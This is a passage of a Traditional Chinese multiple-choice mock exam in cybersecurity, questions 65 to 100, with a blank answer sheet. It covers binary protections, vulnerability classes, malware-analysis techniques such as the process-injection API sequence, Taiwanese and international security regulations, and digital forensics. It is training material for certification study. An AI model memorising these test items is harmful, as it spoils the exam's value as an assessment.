### 第 65 題【系統加固 / 日誌輪替與集中存儲】
在 Linux 系統中，日誌檔案若被惡意攻擊者在本機竄改或清空，將使鑑識工作極其困難。防範本機日誌被竄改最有效的加固手段為何？  
(A) 使用 `chmod 000 /var/log/messages` 封鎖所有人讀寫  
(B) 配置 Rsyslog / Syslog-ng 將關鍵安全日誌即時透過加密通道轉發（Forward）至遠端獨立的 SIEM 或集中式日誌伺服器  
(C) 每天定時手動壓縮備份至 `/tmp` 目錄  
(D) 停用 systemd-journald 服務以避免產生磁碟寫入  

---

## 領域五：逆向工程、惡意程式與二進位安全 (第 66 ~ 80 題)

### 第 66 題【二進位防護 / ASLR 機制】
現代作業系統廣泛啟用的記憶體防護機制 ASLR（Address Space Layout Randomization）其主要防禦機制為何？  
(A) 將可執行記憶體分頁標記為不可寫入  
(B) 隨機化進程關鍵記憶體區域的基底位址（如 Stack, Heap, 共享函式庫），使攻擊者難以精確預測跳轉目標位址  
(C) 在函式返回位址前插入 Canary 數值  
(D) 靜態加密執行檔的機器代碼  

### 第 67 題【二進位防護 / DEP 與 NX】
資料執行防止（Data Execution Prevention, DEP / No-Execute, NX）技術其核心運作原理為何？  
(A) 限制 CPU 只能執行核心空間的程式碼  
(B) 利用硬體 CPU 頁表項中的 NX 位元，將堆疊（Stack）與堆積（Heap）等儲存資料的分頁標記為「不可執行」，防止攻擊者直接在堆疊上執行 Shellcode  
(C) 阻止所有外部 DLL 檔案載入記憶體  
(D) 自動攔截所有包含 `\x90` (NOP) 的記憶體字元  

### 第 68 題【二進位防護 / Stack Canary】
編譯器引入的 Stack Smashing Protector（Canary 金絲雀機制）用於檢測堆疊溢位。Canary 數值在函式呼叫堆疊中的具體存放位置為何？  
(A) 緊鄰在函數參數與局部變數之間  
(B) 放置於局部緩衝區（Local Buffers）與保存的基底指標（Saved EBP/RBP）及返回位址（Return Address）之間  
(C) 存放於代碼段（.text）開頭  
(D) 存放於全域變數資料段（.data）  

### 第 69 題【二進位漏洞 / ROP 鏈攻擊技術】
在啟用 DEP/NX（堆疊不可執行）保護的現代環境下，攻擊者要控制程式執行流，最常採用何種攻擊技術？  
(A) ROP（Return-Oriented Programming，返回導向編程，拼湊程式或函式庫中既有的 Gadgets 片段）  
(B) NOP Sled 滑行攻擊  
(C) 覆寫環境變數 PATH  
(D) 暴力重送攻擊  

### 第 70 題【二進位漏洞 / 格式化字串漏洞】
在 C 語言程式中，若直接呼叫 `printf(userInput)` 而非 `printf("%s", userInput)`，將導致格式化字串漏洞。攻擊者若傳入下列哪一個格式化說明符（Format Specifier），可以直接將記憶體中某一計數值**寫入**指定的記憶體位址？  
(A) `%x`  
(B) `%p`  
(C) `%n`  
(D) `%s`  

### 第 71 題【二進位漏洞 / Use-After-Free】
釋放後使用（Use-After-Free, UAF）記憶體破壞漏洞的成因與危害為何？  
(A) 記憶體指標在被 `free()` 釋放後未被置為 NULL，後續程式仍引用該懸空指標（Dangling Pointer），若該記憶體塊被攻擊者新分配的惡意物件佔據，引用時將觸發任意代碼執行  
(B) 陣列索引超出上界導致記憶體溢出  
(C) 整數加法運算結果超出最大值翻轉為負數  
(D) 程式嘗試存取 NULL 指標導致崩潰  

### 第 72 題【二進位防護 / PIE 與 RELRO】
在 Linux GCC 編譯安全選項中，若檢查二進位檔案得到 `Full RELRO`，這代表哪一項安全加固措施？  
(A) 程式被靜態編譯且不依賴任何外部庫  
(B) 全域偏移表（Global Offset Table, GOT）在程式啟動動態連結完成後立即被標記為完全唯讀，徹底封鎖 GOT 覆寫攻擊（GOT Overwrite）  
(C) 禁用所有系統呼叫（System Calls）  
(D) 程式碼被混淆加密以防止 IDA Pro 反編譯  

### 第 73 題【靜態分析 / 反組譯控制流圖】
在使用 IDA Pro 或 Ghidra 對二進位執行檔進行靜態分析時，控制流圖（CFG）中條件跳轉指令（如 x86 的 `JZ / JE`）通常會分支出兩條路徑。在 IDA 的圖形視圖中，條件成立（Taken）通常顯示為何種顏色的箭頭？  
(A) 綠色箭頭（Green）  
(B) 紅色箭頭（Red）  
(C) 藍色箭頭（Blue）  
(D) 黑色箭頭（Black）  

### 第 74 題【動態除錯 / 斷點原理】
除錯器（如 GDB、x64dbg）在設定軟體中斷點（Software Breakpoint）時，其底層向目標記憶體位址寫入的 x86/x64 單字節中斷機器碼為何？  
(A) `\x90` (NOP)  
(B) `\xCC` (INT 3)  
(C) `\xCD\x80` (INT 0x80)  
(D) `\x0F\x05` (SYSCALL)  

### 第 75 題【惡意分析 / 反除錯技術】
Windows 惡意程式常用於檢測自身是否正在被除錯器分析的 Win32 API 函數為何？  
(A) `IsDebuggerPresent()`  
(B) `GetCurrentProcessId()`  
(C) `VirtualAlloc()`  
(D) `CreateFileW()`  

### 第 76 題【惡意分析 / 程式碼注入技術】
惡意程式在進行「進程注入」（Process Injection）以將惡意 Shellcode 注入合法系統進程（如 `explorer.exe`）時，最經典的 Windows API 調用序列依序為何？  
(A) `OpenProcess` -> `VirtualAllocEx` -> `WriteProcessMemory` -> `CreateRemoteThread`  
(B) `CreateFile` -> `ReadFile` -> `WriteFile` -> `CloseHandle`  
(C) `RegOpenKey` -> `RegSetValue` -> `RegCloseKey`  
(D) `socket` -> `bind` -> `listen` -> `accept`  

### 第 77 題【惡意分析 / DLL 搜尋順序劫持】
當 Windows 應用程式嘗試載入未指定完整路徑的動態連結庫（DLL）時，若系統未啟用安全 DLL 搜尋模式，預設最優先搜尋的目錄為哪一個？  
(A) 系統目錄 `C:\Windows\System32`  
(B) 應用程式目前所在的目錄（Application Directory）  
(C) Windows 目錄 `C:\Windows`  
(D) 環境變數 PATH 中列出的目錄  

### 第 78 題【惡意分析 / 脫殼技術】
加殼軟體（Packer，如 UPX）常透過壓縮或加密來阻礙靜態分析。加殼程式在記憶體中解壓縮完原始代碼後，必須跳轉回原始程式的進入點以繼續執行。該原始程式進入點在逆向分析中統稱之為何？  
(A) OEP (Original Entry Point)  
(B) IAT (Import Address Table)  
(C) RVA (Relative Virtual Address)  
(D) PE Header  

### 第 79 題【惡意分析 / 檔案偽裝與特徵碼】
在 Windows 系統中，PE 執行檔的開頭兩個字節必定為著名的魔術數字（Magic Number），對應 ASCII 字串為何？  
(A) `PK`  
(B) `MZ` (十六進位 `4D 5A`)  
(C) `\x7FELF`  
(D) `GIF89a`  

### 第 80 題【惡意分析 / 記憶體取證特徵 malfind】
在 Volatility 記憶體取證分析中，`malfind` 插件主要藉由搜尋記憶體中符合哪種特徵的分頁來識別隱匿的代碼注入或木馬 Payload？  
(A) 記憶體保護屬性為 `PAGE_EXECUTE_READWRITE` (RWX) 且通常帶有未對應磁碟檔案的 MZ 標頭或 Shellcode 特徵  
(B) 分頁大小小於 4KB  
(C) 記憶體中包含繁體中文字串  
(D) 具有核心空間 `ring 0` 屬性  

---

## 領域六：資安法規、標準與治理體系 (第 81 ~ 90 題)

### 第 81 題【資安法規 / 資通安全管理法主體】
依據台灣現行《資通安全管理法》，本法之中央主管機關為下列何者？  
(A) 國家安全會議  
(B) 數位發展部  
(C) 國家通訊傳播委員會 (NCC)  
(D) 內政部警政署  

### 第 82 題【資安法規 / 特定非公務機關涵蓋範圍】
《資通安全管理法》規範之適用對象除公務機關外，亦涵蓋「特定非公務機關」。下列哪一類組織**不屬於**該法明定之特定非公務機關？  
(A) 關鍵基礎設施提供者  
(B) 公營事業  
(C) 政府捐助之財團法人  
(D) 一般資本額低於新台幣一千萬元的民間中小型零售商  

### 第 83 題【資安法規 / 資通安全責任等級分級】
依《資通安全責任等級分級辦法》，公務機關與特定非公務機關之資安責任等級劃分為 A、B、C、D、E 五級。下列何者為最高等級「A 級機關」的典型代表？  
(A) 總統府、行政院、外交部、國防部等國家重大政務或涉及全國性關鍵資訊基礎設施主管機關  
(B) 鄉鎮市公所與鄉立圖書館  
(C) 僅維護單一地方性文化活動網站的機構  
(D) 私立專科學校  

### 第 84 題【資安法規 / 資安事件通報時限】
依據台灣《資通安全事件通報及應變辦法》，公務機關或特定非公務機關知悉發生第三級或第四級重大資通安全事件時，應於知悉後多久時限內向主管機關完成通報？  
(A) 1 小時內  
(B) 24 小時內  
(C) 36 小時內  
(D) 72 小時內  

### 第 85 題【資安法規 / 資安事件復原時限】
承上題，機關知悉資通安全事件後，針對第三級或第四級事件，應於知悉後多久時限內完成事件損害控制或復原作業，並送交主管機關備查？  
(A) 12 小時內  
(B) 24 小時內  
(C) 36 小時內  
(D) 72 小時內  

### 第 86 題【個人資料保護 / 特種個資範圍】
依據台灣《個人資料保護法》第 6 條規定，下列哪一項**不屬於**法律明文保護之特種（敏感）個人資料，其原則上不得任意蒐集、處理或利用？  
(A) 病歷與醫療資料  
(B) 基因與性生活資料  
(C) 犯罪前科資料  
(D) 電子郵件地址與公開社群帳號  

### 第 87 題【國際隱私法規 / GDPR 規範】
歐洲聯盟《一般資料保護規則》（GDPR）被公認為全球最嚴格之隱私保護標準。其中規定資料當事人有權要求資料控制者無條件刪除其個人資料的權利，稱之為何？  
(A) 被遺忘權（Right to be Forgotten / Right to Erasure）  
(B) 資料可攜權（Right to Data Portability）  
(C) 拒絕權（Right to Object）  
(D) 知情權（Right to be Informed）  

### 第 88 題【國際資安標準 / ISO 27001:2022 架構】
最新版 ISO/IEC 27001:2022 標準將附錄 A（Annex A）的資安控制項精簡整合為四大主題領域。下列何者**不屬於**這四大主題？  
(A) 組織控制措施（Organizational controls）  
(B) 人員控制措施（People controls）  
(C) 實體控制措施（Physical controls）  
(D) 雲端虛擬控制措施（Cloud virtual controls）  

### 第 89 題【資安框架 / NIST CSF 2.0 核心功能】
美國國家標準與技術研究院（NIST）於 2024 年正式發布網路安全框架 2.0（CSF 2.0）。相較於先前的五大功能，CSF 2.0 全新新增了哪一個居於核心統籌地位的第六大核心功能？  
(A) 治理（Govern, GV）  
(B) 審計（Audit, AU）  
(C) 封鎖（Block, BL）  
(D) 預測（Predict, PR）  

### 第 90 題【資訊架構 / 零信任架構 ZTA 原則】
依據 NIST SP 800-207《零信任架構》（Zero Trust Architecture），零信任安全的核心設計哲學為何？  
(A) 假設內網完全安全，僅防禦外網威脅  
(B) 「永不信任，始終驗證」（Never Trust, Always Verify），預設所有網路流量與存取主體皆具潛在威脅，對所有資產與請求強制進行最小權限持續認證授權  
(C) 只要通過 VPN 連線即視為內部信任節點  
(D) 全面停用雲端服務，所有系統回遷地端機房  

---

## 領域七：資安事件應變與數位鑑識 (第 91 ~ 100 題)

### 第 91 題【事件應變 / NIST SP 800-61 六階段流程】
依據 NIST SP 800-61 建議之電腦安全事件處理流程，標準的事件應變週期順序為何？  
(A) 準備 -> 偵測與分析 -> 圍堵、根除與復原 -> 事後活動  
(B) 偵測 -> 通報 -> 提告 -> 復原  
(C) 圍堵 -> 分析 -> 備份 -> 終止服務  
(D) 事後學習 -> 預警 -> 防禦 -> 報案  

### 第 92 題【數位取證 / RFC 3227 揮發性資料順序】
數位鑑識人員在現場獲取證據時，必須嚴格遵循 RFC 3227《數位證據收集與存檔指引》所定義的「證據揮發性順序」（Order of Volatility）。下列各類存儲媒介中，哪一個應**最優先**進行採證收集？  
(A) 磁碟映像檔（Hard Disk / SSD）  
(B) CPU 快取、暫存器與實體記憶體（RAM）  
(C) 網路連線狀態與行程表  
(D) 光碟與磁帶備份媒體  

### 第 93 題【記憶體鑑識 / Volatility 3 核心插件】
在記憶體鑑識分析中，鑑識人員使用 Volatility 3 分析 Windows 記憶體轉儲檔（memory dump）。若想要「列出記憶體中所有活動的行程清單及其父行程 PID（PPID）」，應執行哪一個插件？  
(A) `windows.pslist`  
(B) `windows.netscan`  
(C) `windows.filescan`  
(D) `windows.hashdump`  

### 第 94 題【記憶體鑑識 / 隱藏行程檢測】
惡意 Rootkit 常透過修改雙向進程活動鏈表（DKOM 技術）將自身行程隱匿，使其不顯示於工作管理員中。在 Volatility 中，哪一個插件能同時對比多個子系統指針，專門用於揪出被 DKOM 技術斷鏈隱藏的惡意進程？  
(A) `windows.psscan` (或 `windows.psxview`)  
(B) `windows.cmdline`  
(C) `windows.envars`  
(D) `windows.handles`  

### 第 95 題【Windows取證 / 安全事件日誌 Event ID】
在調查 Windows 伺服器遭受滲透時，安全日誌（Security.evtx）至關重要。哪一個 Event ID 代表「帳戶成功登入」（An account was successfully logged on）？  
(A) 4624  
(B) 4625  
(C) 4720  
(D) 7045  

### 第 96 題【Windows取證 / 登入類型 Logon Type】
承上題，若在 Windows Event ID 4624 的詳細資訊中，觀察到 `Logon Type: 10`，這代表該登入是透過下列哪一種方式進行的？  
(A) 本機鍵盤滑鼠互動登入（Interactive）  
(B) 網路連線共用目錄登入（Network, 如 SMB/IPC$）  
(C) 遠端桌面連線登入（RemoteInteractive / RDP）  
(D) 系統服務啟動登入（Service）  

### 第 97 題【Windows取證 / 預取檔案 Prefetch】
Windows 系統的 Prefetch 檔案（位於 `C:\Windows\Prefetch\`，副檔名為 `.pf`）在數位鑑識中提供了極具價值的證據。Prefetch 檔案能提供鑑識人員確認下列哪一項關鍵資訊？  
(A) 該應用程式最近的執行時間、執行次數與該程式所加載的 DLL 清單  
(B) 使用者在該程式內輸入的明文密碼  
(C) 程式向外發送的所有 HTTP 封包內容  
(D) 該程式的原始原始碼  

### 第 98 題【檔案系統取證 / NTFS 主檔案表 $MFT】
在 NTFS 檔案系統中，每個檔案的元數據（Metadata）均存放在 `$MFT` 中。其中記錄了「檔案建立時間、最後修改時間、MFT修改時間、最後存取時間」（即 MACB 時間戳）的標準屬性為何？  
(A) `$STANDARD_INFORMATION` (0x10) 與 `$FILE_NAME` (0x30)  
(B) `$DATA` (0x80)  
(C) `$BITMAP` (0xB0)  
(D) `$INDEX_ROOT` (0x90)  

### 第 99 題【數位鑑識 / 證據監管鏈 Chain of Custody】
數位證據要能具備法庭訴訟之證據能力（Admissibility），鑑識人員必須建立嚴謹的「證據監管鏈」（Chain of Custody）。下列哪一項做法會**破壞**證據監管鏈之完整性？  
(A) 採證前先對目標硬碟進行物理寫入保護（Write Blocker）  
(B) 製作硬碟鏡像後，計算 SHA-256 雜湊值並留存書面紀錄  
(C) 鑑識人員直接在原始扣押的受害伺服器主機上開機並安裝鑑識軟體進行除錯分析  
(D) 每次證據移轉均詳細記錄日期、經手人、目的與簽署確認  

### 第 100 題【資安鑑識 / 反鑑識技術檢測】
黑客入侵後常利用「時間戳偽造」（Timestomping）技術，將惡意木馬檔案的建立與修改時間竄改成與系統合法檔案（如 `ntoskrnl.exe`）一模一樣。鑑識專家通常比對 NTFS 中的哪兩個屬性時間戳差異，以識破 Timestomping 偽造？  
(A) 比對 `$STANDARD_INFORMATION` 屬性與 `$FILE_NAME` 屬性中的時間戳（後者由核心維護，一般 Timestomping 工具通常未同步竄改）  
(B) 比對硬碟序號與 MAC 位址  
(C) 比對 BIOS 時間與 NTP 伺服器時間  
(D) 檢查檔案名稱的大小寫狀態  

---

## 考生標準答題卡 (Answer Sheet)

> 請將 1 ~ 100 題的答案填寫於下列表格中（單選，每題填寫 A / B / C / D）：

| 題號 | 答案 | 題號 | 答案 | 題號 | 答案 | 題號 | 答案 | 題號 | 答案 |
| :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
| **01** | [  ] | **21** | [  ] | **41** | [  ] | **61** | [  ] | **81** | [  ] |
| **02** | [  ] | **22** | [  ] | **42** | [  ] | **62** | [  ] | **82** | [  ] |
| **03** | [  ] | **23** | [  ] | **43** | [  ] | **63** | [  ] | **83** | [  ] |
| **04** | [  ] | **24** | [  ] | **44** | [  ] | **64** | [  ] | **84** | [  ] |
| **05** | [  ] | **25** | [  ] | **45** | [  ] | **65** | [  ] | **85** | [  ] |
| **06** | [  ] | **26** | [  ] | **46** | [  ] | **66** | [  ] | **86** | [  ] |
| **07** | [  ] | **27** | [  ] | **47** | [  ] | **67** | [  ] | **87** | [  ] |
| **08** | [  ] | **28** | [  ] | **48** | [  ] | **68** | [  ] | **88** | [  ] |
| **09** | [  ] | **29** | [  ] | **49** | [  ] | **69** | [  ] | **89** | [  ] |
| **10** | [  ] | **30** | [  ] | **50** | [  ] | **70** | [  ] | **90** | [  ] |
| **11** | [  ] | **31** | [  ] | **51** | [  ] | **71** | [  ] | **91** | [  ] |
| **12** | [  ] | **32** | [  ] | **52** | [  ] | **72** | [  ] | **92** | [  ] |
| **13** | [  ] | **33** | [  ] | **53** | [  ] | **73** | [  ] | **93** | [  ] |
| **14** | [  ] | **34** | [  ] | **54** | [  ] | **74** | [  ] | **94** | [  ] |
| **15** | [  ] | **35** | [  ] | **55** | [  ] | **75** | [  ] | **95** | [  ] |
| **16** | [  ] | **36** | [  ] | **56** | [  ] | **76** | [  ] | **96** | [  ] |
| **17** | [  ] | **37** | [  ] | **57** | [  ] | **77** | [  ] | **97** | [  ] |
| **18** | [  ] | **38** | [  ] | **58** | [  ] | **78** | [  ] | **98** | [  ] |
| **19** | [  ] | **39** | [  ] | **59** | [  ] | **79** | [  ] | **99** | [  ] |
| **20** | [  ] | **40** | [  ] | **60** | [  ] | **80** | [  ] | **100** | [  ] |

---
**測驗結束後，請開啟 `mock_exam_a_100q_solutions.md` 進行成績核對與錯題檢討。**
  

